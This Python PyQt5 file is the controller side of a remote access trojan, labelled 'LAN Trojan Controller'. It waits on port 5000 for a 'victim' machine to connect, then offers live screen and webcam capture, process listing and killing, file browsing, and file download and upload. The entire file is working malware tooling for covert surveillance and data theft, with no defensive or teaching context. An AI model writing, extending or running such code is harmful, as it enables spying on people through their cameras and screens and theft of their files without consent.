import sys, socket, json, threading, base64, io, os
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QPixmap, QImage
from PyQt5.QtCore import Qt

# === NETWORK CONSTANTS ===
HOST = "0.0.0.0"
PORT = 5000

MAGIC_START = b"<<<<START>>>>"
MAGIC_END   = b"<<<<END>>>>"
MAGIC_STOP  = b"<<<<STOP>>>>"

socket_lock = threading.Lock()
client_sock = None

# === PROTOCOL ===
def send_json(sock, data):
    raw = json.dumps(data).encode()
    header = MAGIC_START + str(len(raw)).encode() + MAGIC_END
    sock.sendall(header + raw + MAGIC_STOP)

def recv_until(sock, marker):
    buf = b""
    while marker not in buf:
        chunk = sock.recv(1)
        if not chunk:
            raise ConnectionError("Socket closed")
        buf += chunk
    before, after = buf.split(marker, 1)
    return before, after

def recv_json(sock):
    # wait <<<START>>>
    _, buf = recv_until(sock, MAGIC_START)
    # read <<<END>>> for len
    len_str, buf = recv_until(sock, MAGIC_END)
    length = int(len_str.decode())
    # read JSON + <<<STOP>>>
    while len(buf) < length + len(MAGIC_STOP):
        buf += sock.recv(length + len(MAGIC_STOP) - len(buf))
    json_body = buf[:length]
    stop_marker = buf[length:length+len(MAGIC_STOP)]
    if stop_marker != MAGIC_STOP:
        raise ValueError("Protocol mismatch STOP missing!")
    return json.loads(json_body.decode())

def safe_send(sock, data):
    with socket_lock:
        send_json(sock, data)
        return recv_json(sock)

# === GUI ===
class TrojanGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("LAN Trojan Controller")
        self.setGeometry(100,100,900,600)

        layout = QVBoxLayout()

        # INFO
        self.info_label = QLabel("Waiting for victim...")
        layout.addWidget(self.info_label)

        # SCREEN
        self.screen_label = QLabel("Screen Feed")
        layout.addWidget(self.screen_label)
        self.btn_screen = QPushButton("Capture Screen Once")
        self.btn_screen.clicked.connect(self.capture_screen)
        layout.addWidget(self.btn_screen)

        self.btn_live_screen = QPushButton("Start Live Screen")
        self.btn_live_screen.clicked.connect(self.toggle_live_screen)
        layout.addWidget(self.btn_live_screen)
        self.live_screen_running = False

        # WEBCAM
        self.webcam_label = QLabel("Webcam Feed")
        layout.addWidget(self.webcam_label)
        self.btn_webcam = QPushButton("Capture Webcam Once")
        self.btn_webcam.clicked.connect(self.capture_webcam)
        layout.addWidget(self.btn_webcam)

        self.btn_live_webcam = QPushButton("Start Live Webcam")
        self.btn_live_webcam.clicked.connect(self.toggle_live_webcam)
        layout.addWidget(self.btn_live_webcam)
        self.live_webcam_running = False

        # TASK MANAGER
        self.task_list = QListWidget()
        layout.addWidget(self.task_list)
        self.btn_list_tasks = QPushButton("List Tasks")
        self.btn_list_tasks.clicked.connect(self.list_tasks)
        layout.addWidget(self.btn_list_tasks)
        self.btn_kill_task = QPushButton("Kill Selected Task")
        self.btn_kill_task.clicked.connect(self.kill_task)
        layout.addWidget(self.btn_kill_task)

        # FILE MANAGER
        self.path_edit = QLineEdit("C:\\")
        layout.addWidget(self.path_edit)
        self.file_list = QListWidget()
        layout.addWidget(self.file_list)
        self.btn_list_files = QPushButton("List Files")
        self.btn_list_files.clicked.connect(self.list_files)
        layout.addWidget(self.btn_list_files)

        self.btn_download_file = QPushButton("Download Selected File")
        self.btn_download_file.clicked.connect(self.download_file)
        layout.addWidget(self.btn_download_file)
        self.btn_upload_file = QPushButton("Upload File Here...")
        self.btn_upload_file.clicked.connect(self.upload_file)
        layout.addWidget(self.btn_upload_file)

        self.setLayout(layout)

    # === GUI FUNCTIONS ===
    def capture_screen(self):
        resp = safe_send(client_sock, {"action": "screenshot"})
        self.show_image(resp["img"], self.screen_label)

    def toggle_live_screen(self):
        if not self.live_screen_running:
            self.live_screen_running = True
            self.btn_live_screen.setText("Stop Live Screen")
            threading.Thread(target=self.live_screen_loop, daemon=True).start()
        else:
            self.live_screen_running = False
            self.btn_live_screen.setText("Start Live Screen")

    def live_screen_loop(self):
        while self.live_screen_running:
            self.capture_screen()

    def capture_webcam(self):
        resp = safe_send(client_sock, {"action": "webcam"})
        if resp["img"] == "NO_CAM":
            QMessageBox.warning(self, "Webcam", "No webcam available!")
        else:
            self.show_image(resp["img"], self.webcam_label)

    def toggle_live_webcam(self):
        if not self.live_webcam_running:
            self.live_webcam_running = True
            self.btn_live_webcam.setText("Stop Live Webcam")
            threading.Thread(target=self.live_webcam_loop, daemon=True).start()
        else:
            self.live_webcam_running = False
            self.btn_live_webcam.setText("Start Live Webcam")

    def live_webcam_loop(self):
        while self.live_webcam_running:
            self.capture_webcam()

    def list_tasks(self):
        resp = safe_send(client_sock, {"action": "list_tasks"})
        self.task_list.clear()
        for t in resp["tasks"]:
            self.task_list.addItem(f'{t["pid"]} - {t["name"]}')

    def kill_task(self):
        sel = self.task_list.currentItem()
        if sel:
            pid = int(sel.text().split(" - ")[0])
            resp = safe_send(client_sock, {"action": "kill_task", "pid": pid})
            if resp["ok"]:
                QMessageBox.information(self, "Task", "Killed!")
                self.list_tasks()
            else:
                QMessageBox.warning(self, "Task", "Failed!")

    def list_files(self):
        path = self.path_edit.text()
        resp = safe_send(client_sock, {"action": "list_files", "path": path})
        self.file_list.clear()
        for f in resp["files"]:
            tag = "[DIR]" if f["is_dir"] else "[FILE]"
            self.file_list.addItem(f'{tag} {f["name"]}')

    def download_file(self):
        sel = self.file_list.currentItem()
        if sel:
            name = sel.text().split(" ",1)[1]
            remote_path = os.path.join(self.path_edit.text(), name)
            resp = safe_send(client_sock, {"action": "download_file", "path": remote_path})
            save_path, _ = QFileDialog.getSaveFileName(self, "Save File As", name)
            if save_path:
                with open(save_path, "wb") as f:
                    f.write(base64.b64decode(resp["data"]))
                QMessageBox.information(self, "Download", "File saved!")

    def upload_file(self):
        local_path, _ = QFileDialog.getOpenFileName(self, "Choose file")
        if local_path:
            with open(local_path, "rb") as f:
                data_b64 = base64.b64encode(f.read()).decode()
            remote_path = os.path.join(self.path_edit.text(), os.path.basename(local_path))
            resp = safe_send(client_sock, {"action": "upload_file", "path": remote_path, "data": data_b64})
            if resp["ok"]:
                QMessageBox.information(self, "Upload", "Uploaded!")
                self.list_files()

    def show_image(self, b64img, label):
        raw = base64.b64decode(b64img)
        image = QImage.fromData(raw)
        pix = QPixmap.fromImage(image).scaled(640, 360, Qt.KeepAspectRatio)
        label.setPixmap(pix)

# === SOCKET SERVER ===
def socket_server():
    global client_sock
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.bind((HOST, PORT))
    srv.listen(1)
    print(f"[+] Listening on {HOST}:{PORT}")
    client_sock, addr = srv.accept()
    print("[+] Victim connected:", addr)
    info = recv_json(client_sock)
    gui.info_label.setText(f"Victim: {info['hostname']} | OS: {info['os']}")

# === MAIN ===
if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = TrojanGUI()
    gui.show()
    threading.Thread(target=socket_server, daemon=True).start()
    sys.exit(app.exec_())
